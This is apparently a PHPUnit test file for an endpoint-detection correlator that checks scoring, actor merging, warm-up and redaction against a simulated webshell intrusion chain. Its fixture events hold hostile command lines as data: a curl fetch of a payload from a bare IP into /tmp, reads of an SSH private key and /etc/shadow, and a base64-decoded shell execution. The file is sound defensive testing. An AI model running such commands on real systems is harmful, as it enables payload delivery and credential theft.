<?php

namespace Tests\Unit;

use App\Services\Correlation\EdrActorScorer;
use App\Services\Correlation\EdrCorrelator;
use App\Services\Correlation\EdrFacetExtractor;
use App\Services\Correlation\EdrIncident;
use Tests\TestCase;

/**
 * The canonical intrusion chain, scored to the decimal.
 *
 * Hand-computing these numbers once is the test of whether the design is
 * precise enough to implement. Freezing them here is what stops a future
 * "small" change to a weight, a cap or the decay from quietly moving the
 * detection boundary: a constant change that breaks this test is a product
 * decision, not a refactor.
 *
 * The chain is the one every webshell compromise looks like from the inside:
 * recon, a payload fetched from a bare IP, the payload executed from /tmp,
 * an SSH key read, and an outbound connection — each step days or hours from
 * the last, each step defensible on its own, and every one of them arriving
 * as a *separate short-lived process tree* under the same web server.
 */
class EdrCorrelatorChainTest extends TestCase
{
    private const T0 = 1700000000;

    /** Chosen so the per-host threshold jitter is ~1.0, keeping the expected numbers readable. */
    private const HOST = 'web6';

    private string $path;
    private EdrCorrelator $correlator;

    protected function setUp(): void
    {
        parent::setUp();

        $this->path = sys_get_temp_dir() . '/edr-correlator-test-' . uniqid() . '.sqlite';
        $this->correlator = EdrCorrelator::make($this->config(), $this->path);
    }

    protected function tearDown(): void
    {
        $this->correlator->close();

        foreach (['', '-wal', '-shm'] as $suffix) {
            @unlink($this->path . $suffix);
        }

        parent::tearDown();
    }

    private function config(array $overrides = []): array
    {
        return array_merge([
            'correlator_enabled' => true,
            'host_id' => self::HOST,
            'correlator_web_roots' => ['/var/www/html'],
        ], $overrides);
    }

    /* ------------------------------------------------------------------ */
    /* Fixtures                                                            */
    /* ------------------------------------------------------------------ */

    private function event(array $overrides): array
    {
        return array_merge([
            'ts' => self::T0,
            'host' => self::HOST,
            'action' => 'exec',
            'sensor' => 'osquery',
            'pid' => 1000,
            'ppid' => 900,
            'uid' => 33,
            'username' => 'www-data',
            'path' => '/bin/sh',
            'cmdline' => 'sh',
            'cwd' => '/var/www/html',
            'container_id' => '',
        ], $overrides);
    }

    private function finding(string $rule, string $severity, string $mitre = 'T1059'): array
    {
        return ['rule' => $rule, 'name' => $rule, 'severity' => $severity, 'mitre' => $mitre, 'reason' => 'test'];
    }

    /**
     * Make a facet value fully familiar: five distinct days of support, forty
     * days of age. This is what the model would have learned on its own from
     * an ordinary host, compressed into a fixture.
     */
    private function seedFamiliar(int $kind, string $value): void
    {
        $this->correlator->store()->upsertFacets([[
            'fid' => EdrFacetExtractor::fid($kind, $value),
            'kind' => $kind,
            'first_seen' => self::T0 - 40 * 86400,
            'last_seen' => self::T0 - 86400,
            'days_mask' => 0b11111,
            'occ' => 500,
            'bootstrap' => 0,
            'anchor_day' => 0,
            'anchor_set' => null,
        ]]);
    }

    /**
     * Put the model past its warm-up without simulating fifty thousand events.
     */
    private function markMature(): void
    {
        $store = $this->correlator->store();
        $store->setMeta('scored_events', '60000');
        $store->setMeta('first_event_ts', (string) (self::T0 - 30 * 86400));
        $store->setMeta('last_event_ts', (string) (self::T0 - 3600));
        // Simulated event time, real wall clock: declare how long this agent
        // has been watching so the wall-clock bound on the span is satisfied.
        $store->setMeta('watching_since', (string) (time() - 60 * 86400));
    }

    /**
     * Everything the chain needs to look ordinary except the steps that are not.
     */
    private function seedOrdinaryHost(): void
    {
        $this->seedFamiliar(EdrFacetExtractor::KIND_LINEAGE, 'sys:nginx>sys:uname');
        $this->seedFamiliar(EdrFacetExtractor::KIND_IMAGE, 'sys:uname');
        $this->seedFamiliar(EdrFacetExtractor::KIND_IMAGE, 'sys:cat');
        $this->seedFamiliar(EdrFacetExtractor::KIND_ARGSHAPE, EdrFacetExtractor::argShape('uname -a'));
        $this->seedFamiliar(EdrFacetExtractor::KIND_IDENTITY, '33:web');
        $this->seedFamiliar(EdrFacetExtractor::KIND_PRIVTRANS, 'same');
    }

    /**
     * The web server itself, so later events have a parent to descend from.
     */
    private function bootWebServer(): void
    {
        $this->correlator->correlate([
            $this->event([
                'ts' => self::T0 - 60,
                'pid' => 900,
                'ppid' => 1,
                'path' => '/usr/sbin/nginx',
                'cmdline' => '/usr/sbin/nginx -g daemon off;',
                'cwd' => '/',
            ]),
        ]);
    }

    /** @return array<int, array> incidents from one cycle */
    private function cycle(array $events, array $findings = [], array $governance = []): array
    {
        return $this->correlator->correlate($events, $findings, $governance);
    }

    /* ------------------------------------------------------------------ */
    /* The chain                                                           */
    /* ------------------------------------------------------------------ */

    public function test_canonical_chain_scores_exactly_and_emits_once(): void
    {
        $this->seedOrdinaryHost();
        $this->markMature();
        $this->bootWebServer();

        // 1. Recon. Every facet familiar; the only charge is the rule hit.
        $incidents = $this->cycle(
            [$this->event([
                'ts' => self::T0,
                'pid' => 1001,
                'path' => '/usr/bin/uname',
                'cmdline' => 'uname -a',
            ])],
            [0 => [$this->finding('EDR-001', 'medium', 'T1033')]],
            [0 => [['emit' => true, 'reason' => null]]]
        );

        $this->assertSame([], $this->actorIncidents($incidents), 'One recon command is not an incident');

        // 2. Payload fetched from a bare IP. Three novel facets, scaled by the
        //    web exposure multiplier, plus a critical rule hit.
        $incidents = $this->cycle(
            [$this->event([
                'ts' => self::T0 + 2,
                'pid' => 1002,
                'path' => '/usr/bin/curl',
                'cmdline' => 'curl http://198.51.100.7/x -o /tmp/.s',
            ])],
            [0 => [$this->finding('EDR-001', 'critical', 'T1505.003')]],
            [0 => [['emit' => true, 'reason' => null]]]
        );

        $this->assertSame([], $this->actorIncidents($incidents), 'Three classes but still under the bar');

        // 3. The payload runs, four hours later — a different process tree,
        //    the same actor.
        $incidents = $this->cycle(
            [$this->event([
                'ts' => self::T0 + 14400,
                'pid' => 1003,
                'path' => '/tmp/.s',
                'cmdline' => '/tmp/.s',
            ])],
            [0 => [$this->finding('EDR-004', 'medium', 'T1059')]],
            [0 => [['emit' => true, 'reason' => null]]]
        );

        $this->assertSame([], $this->actorIncidents($incidents));

        // 4. Credential access. This is the step that crosses.
        $incidents = $this->actorIncidents($this->cycle(
            [$this->event([
                'ts' => self::T0 + 14460,
                'pid' => 1004,
                'path' => '/usr/bin/cat',
                'cmdline' => 'cat /home/deploy/.ssh/id_rsa',
            ])],
            [0 => [$this->finding('EDR-006', 'high', 'T1552')]],
            [0 => [['emit' => true, 'reason' => null]]]
        ));

        $this->assertCount(1, $incidents, 'The chain must raise exactly one incident');

        $finding = $incidents[0]['findings'][0];
        $incident = $finding['incident'];

        $this->assertSame(EdrIncident::RULE_ACTOR, $finding['rule']);
        $this->assertSame('high', $finding['severity']);
        $this->assertEqualsWithDelta(24.924, $incident['score'], 0.005, 'Score must match the hand-computed chain');
        $this->assertSame(
            ['ENTRY', 'DISCOVERY', 'STAGING', 'CRED'],
            $incident['classes'],
            'Four kill-chain stages, in order'
        );
        $this->assertEqualsWithDelta(3.0, $incident['ordering_bonus'], 1e-9, 'A perfectly forward chain earns the full bonus');
        $this->assertEqualsWithDelta(21.924, $incident['capped_sum'], 0.005);
        $this->assertSame('strong', $incident['corroboration']);

        // 5. Egress, one minute later. The chain is still running and the
        //    score keeps climbing — but a second alert would just be the same
        //    incident said twice.
        $incidents = $this->actorIncidents($this->cycle(
            [$this->event([
                'ts' => self::T0 + 14520,
                'pid' => 1004,
                'action' => 'connect',
                'path' => '/tmp/.s',
                'cmdline' => '/tmp/.s',
                'remote_address' => '45.32.1.9',
                'remote_port' => 443,
            ])]
        ));

        $this->assertSame([], $incidents, 'Escalation, not repetition: no second alert without a 1.6x jump');
    }

    /**
     * The property the whole design rests on: the same five commands, each
     * arriving under its own short-lived process, still land in one bucket.
     * Every tree-rooted correlator sees five unrelated one-event trees here.
     */
    public function test_webshell_requests_merge_into_one_actor(): void
    {
        $this->seedOrdinaryHost();
        $this->markMature();
        $this->bootWebServer();

        $store = $this->correlator->store();

        $this->cycle(
            [$this->event(['ts' => self::T0, 'pid' => 2001, 'path' => '/usr/bin/uname', 'cmdline' => 'uname -a'])],
            [0 => [$this->finding('EDR-001', 'medium')]]
        );
        $this->cycle(
            [$this->event(['ts' => self::T0 + 5, 'pid' => 2002, 'path' => '/usr/bin/curl', 'cmdline' => 'curl http://198.51.100.7/x -o /tmp/.s'])]
        );
        $this->cycle(
            [$this->event(['ts' => self::T0 + 9, 'pid' => 2003, 'path' => '/usr/bin/cat', 'cmdline' => 'cat /home/deploy/.ssh/id_rsa'])],
            [0 => [$this->finding('EDR-006', 'high')]]
        );

        $actors = $store->loadActors([self::HOST . '|33|web||']);

        $this->assertArrayHasKey(
            self::HOST . '|33|web||',
            $actors,
            'Three separate process trees under php-fpm/nginx must share one actor'
        );
        $this->assertGreaterThanOrEqual(3, (int) $actors[self::HOST . '|33|web||']['event_count']);
    }

    /**
     * The false-positive bound, executable.
     *
     * Two classes cannot reach the threshold at any volume — not because a
     * threshold was tuned to keep them out, but because the sum of the two
     * heaviest caps is below the floor. This is the assertion that replaces an
     * exclusion list.
     */
    public function test_two_classes_can_never_alert(): void
    {
        $this->seedOrdinaryHost();
        $this->markMature();
        $this->bootWebServer();

        // Every facet familiar, so nothing lights structurally and the only
        // evidence is the two rule hits. This is what "two classes" has to
        // mean for the assertion to be about the bound rather than about the
        // fixture.
        $this->seedFamiliar(EdrFacetExtractor::KIND_LINEAGE, 'sys:nginx>sys:passwd');
        $this->seedFamiliar(EdrFacetExtractor::KIND_IMAGE, 'sys:passwd');
        $this->seedFamiliar(EdrFacetExtractor::KIND_ARGSHAPE, EdrFacetExtractor::argShape('passwd -S deploy'));

        $emitted = 0;

        // Five hundred repetitions of the two most expensive classes.
        for ($i = 0; $i < 500; $i++) {
            $incidents = $this->cycle(
                [$this->event([
                    'ts' => self::T0 + $i * 60,
                    'pid' => 3000 + $i,
                    'path' => '/usr/bin/passwd',
                    'cmdline' => 'passwd -S deploy',
                ])],
                [0 => [$this->finding('EDR-010', 'high'), $this->finding('EDR-006', 'high')]],
                [0 => [['emit' => true, 'reason' => null], ['emit' => true, 'reason' => null]]]
            );

            $emitted += count($this->actorIncidents($incidents));
        }

        $actor = $this->correlator->store()->loadActors([self::HOST . '|33|web||'])[self::HOST . '|33|web||'];
        $acc = (array) json_decode((string) $actor['acc'], true);

        $this->assertSame(
            [\App\Services\Correlation\EdrIntentClassifier::PRIVESC,
             \App\Services\Correlation\EdrIntentClassifier::CRED],
            array_map('intval', array_keys($acc)),
            'The fixture must light exactly two classes, or this proves nothing'
        );
        $this->assertSame(0, $emitted, 'PRIVESC + CRED alone cannot cross, however often they fire');

        $scorer = new EdrActorScorer([]);
        $cap = $scorer->capFor(4) + $scorer->capFor(5);

        $this->assertLessThan(
            EdrActorScorer::DEFAULT_T_FLOOR,
            $cap,
            'The two heaviest class caps must sum to less than the threshold floor'
        );
    }

    /**
     * Volume buys nothing. This is the single most important property of the
     * familiarity model, and the reason `occ` never enters the arithmetic.
     */
    public function test_volume_poisoning_buys_no_familiarity(): void
    {
        $this->seedOrdinaryHost();
        $this->markMature();
        $this->bootWebServer();

        // Isolate the one dimension under test: everything else about this
        // event is already familiar, so the learn gate lets the image facet
        // through and the only question left is how fast it can mature.
        $this->seedFamiliar(EdrFacetExtractor::KIND_LINEAGE, 'sys:nginx>tmp:.implant');
        $this->seedFamiliar(EdrFacetExtractor::KIND_ARGSHAPE, EdrFacetExtractor::argShape('/tmp/.implant'));

        $fid = EdrFacetExtractor::fid(EdrFacetExtractor::KIND_IMAGE, 'tmp:.implant');

        // Two thousand executions inside four days.
        for ($i = 0; $i < 2000; $i++) {
            $day = intdiv($i, 500);

            $this->cycle([$this->event([
                'ts' => self::T0 + $day * 86400 + $i,
                'pid' => 4000 + $i,
                'path' => '/tmp/.implant',
                'cmdline' => '/tmp/.implant',
            ])]);
        }

        $rows = $this->correlator->store()->loadFacets([$fid]);

        $this->assertArrayHasKey($fid, $rows, 'The value was seen, so it exists');

        $support = \App\Services\Correlation\EdrCorrelatorStore::popcount((int) $rows[$fid]['days_mask']);

        $this->assertLessThanOrEqual(
            4,
            $support,
            'Two thousand executions across four days must buy at most four days of support'
        );
        $this->assertGreaterThan(
            100,
            (int) $rows[$fid]['occ'],
            'Occurrences are still counted — they are just worth nothing'
        );
        $this->assertLessThan(
            1.0,
            min(1.0, $support / 5) * min(1.0, 3 / 10),
            'Four days of support over four days of age is not familiarity'
        );
    }

    /**
     * The other half of the poisoning defence: an event that is novel in
     * several dimensions at once teaches nothing at all, so an attacker cannot
     * condition the whole model with one wholly-new action repeated. Only
     * roughly one dimension at a time gets through, which multiplies the
     * calendar cost by the number of dimensions they need.
     */
    public function test_an_event_novel_in_many_dimensions_teaches_nothing(): void
    {
        $this->markMature();
        $this->bootWebServer();

        $this->cycle([$this->event([
            'ts' => self::T0,
            'pid' => 4500,
            'uid' => 0,
            'username' => 'root',
            'path' => '/tmp/.stage1',
            'cmdline' => 'sh -c "$(echo aGVsbG8gd29ybGQgdGhpcyBpcyBiYXNlNjQ= | base64 -d)"',
            'cwd' => '/dev/shm',
        ])]);

        $fids = [
            EdrFacetExtractor::fid(EdrFacetExtractor::KIND_IMAGE, 'tmp:.stage1'),
            EdrFacetExtractor::fid(EdrFacetExtractor::KIND_LINEAGE, 'sys:nginx>tmp:.stage1'),
        ];

        $this->assertSame(
            [],
            $this->correlator->store()->loadFacets($fids),
            'Nothing about a wholly novel event may be learned from it'
        );
    }

    /**
     * A rule someone deliberately switched off must not reach an analyst by
     * the back door. An off switch that does not work is worse than a missed
     * detection.
     */
    public function test_disabled_rules_are_not_used_as_evidence(): void
    {
        $this->seedOrdinaryHost();
        $this->markMature();
        $this->bootWebServer();

        for ($i = 0; $i < 20; $i++) {
            $this->cycle(
                [$this->event([
                    'ts' => self::T0 + $i * 300,
                    'pid' => 5000 + $i,
                    'path' => '/usr/bin/cat',
                    'cmdline' => 'cat /etc/shadow',
                ])],
                [0 => [$this->finding('EDR-006', 'critical')]],
                [0 => [['emit' => false, 'reason' => 'rule_disabled']]]
            );
        }

        $actors = $this->correlator->store()->loadActors([self::HOST . '|33|web||']);
        $acc = json_decode((string) ($actors[self::HOST . '|33|web||']['acc'] ?? '{}'), true);

        $this->assertArrayNotHasKey(
            (string) \App\Services\Correlation\EdrIntentClassifier::CRED,
            (array) $acc,
            'A disabled rule must not light its class'
        );
    }

    /**
     * Nothing may be emitted before the model knows what this host looks like.
     * On day one every facet is novel and every actor would cross.
     */
    public function test_warmup_is_silent(): void
    {
        $this->seedOrdinaryHost();
        $this->bootWebServer();

        $incidents = [];

        foreach ([0, 2, 14400, 14460] as $offset) {
            $incidents = array_merge($incidents, $this->actorIncidents($this->cycle(
                [$this->event([
                    'ts' => self::T0 + $offset,
                    'pid' => 6000 + $offset,
                    'path' => '/tmp/.s' . $offset,
                    'cmdline' => '/tmp/.s' . $offset,
                ])],
                [0 => [$this->finding('EDR-006', 'critical')]],
                [0 => [['emit' => true, 'reason' => null]]]
            )));
        }

        $this->assertSame([], $incidents, 'An immature model must say nothing at all');

        $stats = $this->correlator->stats();
        $this->assertFalse($stats['mature']);
        $this->assertGreaterThan(0, $stats['warmup_withheld'], 'What it would have said is still counted');
    }

    /**
     * State lives on disk because the agent process exits every thirty
     * seconds. If this regresses, the correlator silently degrades to
     * single-cycle correlation and nobody notices.
     */
    public function test_state_survives_a_process_boundary(): void
    {
        $this->seedOrdinaryHost();
        $this->markMature();
        $this->bootWebServer();

        $this->cycle(
            [$this->event(['ts' => self::T0, 'pid' => 7001, 'path' => '/usr/bin/uname', 'cmdline' => 'uname -a'])],
            [0 => [$this->finding('EDR-001', 'medium')]],
            [0 => [['emit' => true, 'reason' => null]]]
        );
        $this->cycle(
            [$this->event(['ts' => self::T0 + 2, 'pid' => 7002, 'path' => '/usr/bin/curl', 'cmdline' => 'curl http://198.51.100.7/x -o /tmp/.s'])],
            [0 => [$this->finding('EDR-001', 'critical')]],
            [0 => [['emit' => true, 'reason' => null]]]
        );

        // The process exits here, exactly as it does in production.
        $this->correlator->close();
        $this->correlator = EdrCorrelator::make($this->config(), $this->path);

        $incidents = $this->actorIncidents($this->cycle(
            [$this->event(['ts' => self::T0 + 14460, 'pid' => 7003, 'path' => '/usr/bin/cat', 'cmdline' => 'cat /home/deploy/.ssh/id_rsa'])],
            [0 => [$this->finding('EDR-006', 'high')]],
            [0 => [['emit' => true, 'reason' => null]]]
        ));

        $this->assertCount(1, $incidents, 'A chain spanning an agent restart is still one chain');
    }

    /**
     * Secrets must never reach the evidence payload, which travels to the Hub
     * and into every support bundle taken afterwards.
     */
    public function test_evidence_is_redacted(): void
    {
        $this->seedOrdinaryHost();
        $this->markMature();
        $this->bootWebServer();

        $this->cycle(
            [$this->event([
                'ts' => self::T0,
                'pid' => 8001,
                'path' => '/usr/bin/mysql',
                'cmdline' => 'mysql -u root -phunter2 --execute="select 1"',
            ])],
            [0 => [$this->finding('EDR-006', 'high')]],
            [0 => [['emit' => true, 'reason' => null]]]
        );

        $actors = $this->correlator->store()->loadActors([self::HOST . '|33|web||']);
        $evidence = (string) ($actors[self::HOST . '|33|web||']['evidence'] ?? '');

        $this->assertStringNotContainsString('hunter2', $evidence, 'The password must not reach the evidence ring');
        $this->assertStringContainsString('mysql', $evidence, 'The command itself is still evidence');
    }

    /**
     * A daemon that has been running since boot must stay resolvable as a
     * parent for as long as it keeps spawning children.
     *
     * This is a regression test for a failure that is invisible until it has
     * been running for a week: the lineage row for nginx aged out on a TTL
     * measured from process start, so on day eight every web request stopped
     * resolving its parent, became an orphan, and fell into a five-minute
     * time bucket — a different actor every five minutes. Nothing errors, no
     * alert is lost immediately, and the single property the whole design
     * exists for is simply gone. Real web servers run for months.
     */
    public function test_long_lived_daemons_do_not_age_out_of_the_lineage(): void
    {
        $this->seedOrdinaryHost();
        $this->markMature();
        $this->bootWebServer();

        // Three weeks of ordinary web activity — well past the lineage TTL.
        for ($day = 0; $day < 21; $day++) {
            $this->cycle([$this->event([
                'ts' => self::T0 + $day * 86400,
                'pid' => 9000 + $day,
                'path' => '/usr/bin/uname',
                'cmdline' => 'uname -a',
            ])]);
        }

        $store = $this->correlator->store();

        $this->assertArrayHasKey(
            self::HOST . '|33|web||',
            $store->loadActors([self::HOST . '|33|web||']),
            'Web requests three weeks after boot must still anchor to the web actor'
        );

        $pdo = new \PDO('sqlite:' . $this->path);
        $pdo->setAttribute(\PDO::ATTR_DEFAULT_FETCH_MODE, \PDO::FETCH_ASSOC);
        // nginx itself anchors as an orphan — its own parent (systemd) was
        // never observed — but nothing that ran after it may.
        $orphans = $pdo->query(
            "SELECT COUNT(*) FROM actors WHERE anchor_kind = 'orphan' AND last_ts > " . (self::T0 - 30)
        )->fetchColumn();

        $this->assertSame(0, (int) $orphans, 'No web request may degrade into an orphan actor');

        $survivors = $pdo->query('SELECT COUNT(*) FROM procs WHERE pid = 900')->fetchColumn();

        $this->assertGreaterThan(0, (int) $survivors, 'The web server must still be in the lineage table');
    }

    /**
     * A recycled pid must not adopt a process that predates it.
     */
    public function test_pid_reuse_does_not_join_lineages(): void
    {
        $this->seedOrdinaryHost();
        $this->markMature();
        $this->bootWebServer();

        // A shell under the web server, which then exits.
        $this->cycle([$this->event([
            'ts' => self::T0,
            'pid' => 4242,
            'path' => '/bin/bash',
            'cmdline' => 'bash',
        ])]);

        // The same pid, reused by an unrelated cron job.
        $this->cycle([$this->event([
            'ts' => self::T0 + 600,
            'pid' => 4242,
            'ppid' => 800,
            'uid' => 0,
            'username' => 'root',
            'path' => '/bin/bash',
            'cmdline' => 'bash /usr/local/bin/rotate.sh',
            'cwd' => '/',
        ])]);

        // A child claiming pid 4242 as its parent, after the reuse.
        $this->cycle([$this->event([
            'ts' => self::T0 + 900,
            'pid' => 4300,
            'ppid' => 4242,
            'uid' => 0,
            'username' => 'root',
            'path' => '/usr/bin/gzip',
            'cmdline' => 'gzip /var/log/app.log',
            'cwd' => '/',
        ])]);

        $keys = array_keys($this->correlator->store()->loadActors([
            self::HOST . '|33|web||',
            self::HOST . '|0|web||',
        ]));

        $this->assertNotContains(
            self::HOST . '|0|web||',
            $keys,
            'A root process must not inherit the web actor through a recycled pid'
        );
    }

    /**
     * Incidents from the actor lane only. The host lane is a different
     * detection and is asserted separately.
     *
     * @param  array<int, array> $incidents
     * @return array<int, array>
     */
    private function actorIncidents(array $incidents): array
    {
        return array_values(array_filter(
            $incidents,
            static fn (array $incident): bool => ($incident['rule'] ?? '') === EdrIncident::RULE_ACTOR
        ));
    }
}
